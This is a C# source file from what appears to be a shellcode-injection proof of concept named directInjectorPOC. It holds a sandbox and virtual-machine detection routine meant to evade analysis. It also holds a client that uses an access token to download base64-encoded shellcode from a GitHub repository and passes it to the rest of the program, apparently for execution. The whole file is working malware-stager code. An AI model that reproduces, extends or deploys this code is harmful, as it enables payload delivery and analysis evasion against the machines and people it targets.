using System;
using System.Collections;
using System.Management;
using System.Diagnostics;
using System.Net.Security;
using System.Net;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;

namespace directInjectorPOC
{
    public class SslTcpClient
    {
        private static Hashtable certificateErrors = new Hashtable();
        public static bool CheckSandbox()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    using (var items = searcher.Get())
                    {
                        foreach (var item in items)
                        {
                            string manufacturer = item["Manufacturer"].ToString().ToLower();
                            if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || manufacturer.Contains("vmware") || item["Model"].ToString() == "VirtualBox")
                            {
                                return true;
                            }
                        }
                    }
                }
                return false;
            }
            catch
            {
                return true;
            }
        }
        public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            if (sslPolicyErrors == SslPolicyErrors.None)
            {
                Console.WriteLine("[+] Certificate verified");
                return true;
            }
            Console.WriteLine("[!] Certificate error: {0}", sslPolicyErrors);
            return false;
        }
        public static void RunClient(string machineName, string project, string username, string token)
        {
            TcpClient client = new TcpClient(machineName, 443);
            Console.WriteLine("[+] Client connected");
            SslStream sslStream = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateServerCertificate), null);
            try
            {
                const SslProtocols _Tls12 = (SslProtocols)3072;
                const SecurityProtocolType Tls12 = (SecurityProtocolType)_Tls12;
                ServicePointManager.SecurityProtocol = Tls12;
                sslStream.AuthenticateAsClient(machineName, null, _Tls12, false);
            }
            catch (AuthenticationException e)
            {
                Console.WriteLine("[!] Exception: {0}", e.Message);
                if (e.InnerException != null)
                {
                    Console.WriteLine("[!] Inner exception: {0}", e.InnerException.Message);
                }
                Console.WriteLine("[!] Authentication failed - closing the connection.");
                client.Close();
                return;
            }

            Console.WriteLine("[+] Reading shellcode...");

            string shellcode_headers = "GET /repos/" + username + "/" + project + "/contents/shellcode.bin HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36\r\nHost: api.github.com\r\nAuthorization: Basic " + token + "\r\nAccept: application/json\r\n\r\n";
            byte[] shellcode_messsage = Encoding.UTF8.GetBytes(shellcode_headers);
            sslStream.Write(shellcode_messsage, 0, shellcode_messsage.Length);
            sslStream.Flush();

            string shellcode_raw = ReadMessage(sslStream);
            Regex rx1 = new Regex("\"content\": \"(.*?)\"");
            string shellcode_base64 = rx1.Match(shellcode_raw).Groups[1].Value;
            shellcode_base64 = Regex.Replace(shellcode_base64, @"\\n|\\", "");
            Program.sc = shellcode_base64;
            client.Close();
            Console.WriteLine("[+] Client closed");
            return;
        }
        static string ReadMessage(SslStream sslStream)
        {
            byte[] buffer = new byte[10000];
            StringBuilder messageData = new StringBuilder();
            int bytes;
            string output = "";
            do
            {
                bytes = sslStream.Read(buffer, 0, buffer.Length);
                output += Encoding.UTF8.GetString(buffer, 0, bytes);
                if (output.ToString().IndexOf("\"html\"") != -1)
                {
                    break;
                }
            } while (bytes != 0);
            Console.WriteLine("[+] Done reading");
            return output;
        }
    }
}